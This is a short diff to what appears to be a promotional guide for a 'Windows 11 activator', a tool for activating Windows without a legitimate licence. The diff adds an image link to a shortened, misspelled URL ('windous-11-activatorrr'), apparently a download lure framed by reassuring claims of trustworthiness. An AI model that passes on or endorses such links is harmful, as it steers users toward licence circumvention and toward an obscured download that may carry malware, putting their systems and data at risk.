@@ -4,6 +4,8 @@ Are you seeking a trustworthy Windows 11 activator but are worried about the pos
 But don't worry – this guide is here to help. It will cover everything you need to know. By the end of this, your Windows 11 will be fully activated and running smoothly.
 
 
+[![5626245724568](https://github.com/user-attachments/assets/f1051185-9685-417b-9f5b-936e49d95990)](https://y.gy/windous-11-activatorrr)
+
 ## What is the purpose of the Activate button in Windows 11?
 A Windows 11 activator is a procedure or tool that facilitates the activation of the Windows 11 system. 
 
